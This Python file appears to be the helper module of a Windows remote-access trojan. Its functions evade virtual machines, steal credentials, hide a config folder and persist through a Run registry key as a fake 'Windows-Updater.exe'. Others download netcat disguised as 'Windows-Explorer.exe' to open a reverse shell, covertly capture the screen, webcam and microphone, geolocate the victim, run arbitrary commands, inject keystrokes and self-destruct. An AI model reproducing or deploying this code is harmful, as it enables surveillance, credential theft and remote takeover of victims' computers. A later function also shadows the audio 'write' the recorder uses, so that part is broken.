
import subprocess as sp
from cv2 import VideoCapture, imwrite
from urllib.request import urlopen
from libraries import credentials
from sounddevice import rec, wait
from scipy.io.wavfile import write
import threading
import pyautogui
import requests
import platform
import random
import shutil
import json
import ctypes
import sys
import re
import os


def isVM():
    rules = ['Virtualbox', 'vmbox', 'vmware']
    command = sp.Popen("SYSTEMINFO | findstr \"System Info\"",
                       stderr = sp.PIPE,
                       stdin = sp.DEVNULL,
                       stdout = sp.PIPE,
                       shell = True,
                       text = True,
                       creationflags = 0x08000000)
    
    out, err = command.communicate()
    command.wait()
    
    for rule in rules:
        if re.search(rule, out, re.IGNORECASE):
            return True
    return False    


def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        is_admin = False
    return is_admin


def getIP():
    url = 'https://api.myip.com'
    try:
        response = urlopen(url)
        IP = json.loads(response.read())['ip']
    except Exception:
        IP = "None"
    return IP


def getBits():
    try:
        BITS = platform.architecture()[0]
    except Exception:
        BITS = "None"
    return BITS


def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception:
        USERNAME = "None"
    return USERNAME


def getOS():
    try:
        OS = platform.platform()
    except Exception:
        OS = "None"
    return OS


def getCPU():
    try:
        CPU = platform.processor()
    except Exception:
        CPU = "None"
    return CPU


def getHostname():
    try:
        HOSTNAME = platform.node()
    except Exception:
        HOSTNAME = "None"
    return HOSTNAME


def createConfig():
    try:
        path = fr'"C:\Users\{getUsername()}\.config"'
        new_path = path[1:-1]
        os.mkdir(new_path)
        os.system(f"attrib +h {path}")
        path = new_path + fr"\uploads"
        os.mkdir(path)
        return True
    
    except WindowsError as e:
        if e.winerror == 183:
            return False


def id() -> str:
    path = fr"C:\Users\{getUsername()}\.config\ID"
    
    def createID(file):
        ID = file.read()
        if ID == "":
            ID = random.randint(1, 10000)
            file.write(str(ID))
        return str(ID)
    try:    
        with open(path, "r+") as IDfile:
            return createID(IDfile)

    except Exception:
        with open(path, "w+") as IDfile:
            return createID(IDfile)


def cd(path):
    try:
        os.chdir(fr"{path}")
        return True
    except Exception as e:
        return e


def process():
    result = sp.Popen(
        "tasklist",
        stderr = sp.PIPE,
        stdin = sp.DEVNULL,
        stdout = sp.PIPE,
        shell = True,
        text = True,
        creationflags = 0x08000000
    )
    out, err = result.communicate()
    result.wait()
    return out


def upload(url, name):
    path = fr'C:\Users\{getUsername()}\.config\uploads'
    
    try:
        r = requests.get(url, allow_redirects = True, verify = False)
        open(fr"{path}\{name}", "wb").write(r.content)
        return True
    
    except Exception as e:
        return e


def screenshot():
    try:
        Screenshot = pyautogui.screenshot()
        path = os.environ["temp"] + "\\s.png"
        Screenshot.save(path)
        return path
    except Exception as e:
        return False


def webshot():
    try:
        cam = VideoCapture(0)
        ret, frame = cam.read()
        path = os.environ["temp"] + "\\p.png"
        imwrite(path, frame)
        return path
    except Exception as e:
        return False


def creds():
    try:
        data = credentials.stealcreds()
        path = os.environ["temp"] + "\\data.json"
        with open(path, 'w+') as outfile:
            json.dump(data, outfile, indent=4)
        return path
    except Exception:
        return False


def persistent():
    try:
        backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
        if not os.path.exists(backdoor_location):
            shutil.copyfile(sys.executable, backdoor_location)
            sp.call(
                rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{backdoor_location}" /f',
                shell = True
            )
            return True
        else:
            return "already-enabled"
    except Exception as e:
        return e


def cmd(command:str):
    result = sp.Popen(
        command.split(),
        stderr = sp.PIPE,
        stdin = sp.DEVNULL,
        stdout = sp.PIPE,
        shell = True,
        text = True,
        creationflags = 0x08000000
    )
    out, err = result.communicate()
    result.wait()
    if err:
        return err
    else:
        return out


def selfdestruct():
    try:
        update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
        config_location = fr'C:\Users\{getUsername()}\.config'
        
        sp.call(
            rf'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f',
            shell = True
        )
        
        if os.path.exists(update_location):
            os.remove(update_location)
        if os.path.exists(config_location):
            shutil.rmtree(config_location)
        
        return True

    except Exception as e:
        return e


def location():
    try:
        response = requests.get('https://ipinfo.io')
        data = response.json()
        return data
    except Exception:
        return False


def revshell(ip, port):
    def exec(IP, PORT):
        if not os.path.exists(os.environ["temp"] + '\\Windows-Explorer.exe'):
            r = requests.get(
                "https://github.com/int0x33/nc.exe/raw/master/nc64.exe",
                allow_redirects = True,
                verify = False
            )
            open(os.environ["temp"] + '\\Windows-Explorer.exe', 'wb').write(r.content)
        else:
            try:
                result = sp.Popen(
                    f"{os.environ["temp"]}\\Windows-Explorer.exe {IP} {PORT} -e cmd.exe /b",
                    stderr = sp.PIPE,
                    stdin = sp.DEVNULL,
                    stdout = sp.PIPE,
                    shell = True,
                    text = True,
                    creationflags = 0x08000000
                )
                out, err = result.communicate()
                result.wait()
                return True
            except Exception:
                return False
            
    
    threading.Thread(target = exec, args = (ip, port)).start()
    return True


def recordmic(seconds):
    try:
        fs = 44100
        recording = rec(int(seconds * fs), samplerate=fs, channels=2)
        wait()
        os.chdir(fr"C:\Users\{getUsername()}\.config\uploads")
        write('recording.wav', fs, recording)
        path = fr"C:\Users\{getUsername()}\.config\uploads\recording.wav"
        return path
    except Exception as e:
        print(e)
        return False


def wallpaper(path:str):
    if path.startswith("http"):
        try:
            wallpaper_name = f"wallpaper.{path[-3:]}"
            r = requests.get(path, allow_redirects = True, verify = False)
            open(fr"C:\Users\{getUsername()}\.config\uploads\{wallpaper_name}", 'wb').write(r.content)
            wallpaper_location = fr"C:\Users\{getUsername()}\.config\uploads\{wallpaper_name}"
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_location, 0)
            return True
        except Exception as e:
            return e
    else:
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            return True
        except Exception as e:
            return e


def killproc(pid):
    result = sp.Popen(
        f"taskkill /F /PID {pid}",
        stderr = sp.PIPE,
        stdin = sp.DEVNULL,
        stdout = sp.PIPE,
        shell = True,
        text = True,
        creationflags = 0x08000000
    )
    out, err = result.communicate()
    result.wait()

    if err:
        return err
    else:
        return True


def write(string:str, interval:float):
    try:
        pyautogui.write(string, interval = interval)
        return True
    except Exception:
        return False
    

def press(letter:str):
    try:
        pyautogui.press(letter)
        return True
    except Exception:
        return False
    
        
def message(message:str):
    try:
        sp.call(
            rf'msg "%username%" {message}',
            shell = True
        )
        return True
    except Exception:
        return False
    